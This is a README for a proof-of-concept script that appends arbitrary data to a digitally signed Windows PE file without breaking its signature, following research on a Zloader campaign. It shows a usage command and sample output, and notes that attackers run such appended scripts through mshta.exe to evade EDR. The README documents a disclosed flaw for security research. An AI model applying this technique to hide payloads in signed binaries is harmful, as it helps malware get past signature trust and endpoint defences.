# SignaturePayload

This is a POC following [my research](https://research.checkpoint.com/2022/can-you-trust-a-files-digital-signature-new-zloader-campaign-exploits-microsofts-signature-verification-putting-users-at-risk/) regarding Microsoft's digital verification vulnerability. 

In summary, it is possible to append data to a signed PE while keepling the validity of the signature, this script allows you to do that.

### How to use it?
```
python3 SignaturePayload.py <inputfile> <data> <output>
[*] Reading signed input file
[*] Reading payload content
[*] Size of data to be written - 0xxx
[*] Merging data in memory
[*] Changing signature size header from 0xxxxx to 0xxxxx
[*] Old security directory:
	 [IMAGE_DIRECTORY_ENTRY_SECURITY]
0x1A8      0x0   VirtualAddress:                0xxxxxx   
0x1AC      0x4   Size:                          0xxxxx    
[*] New security directory:
	 [IMAGE_DIRECTORY_ENTRY_SECURITY]
0x1A8      0x0   VirtualAddress:                0xxxxxx   
0x1AC      0x4   Size:                          0xxxxx    
[*] Finished

```

### Why is it useful?

Threat actors have been known to append scripts to DLLs signed by Microsoft and run them using mshta.exe in order to evade some EDRs.

This script is for educational purposes and testing ONLY. Do not use for malicious purposes. 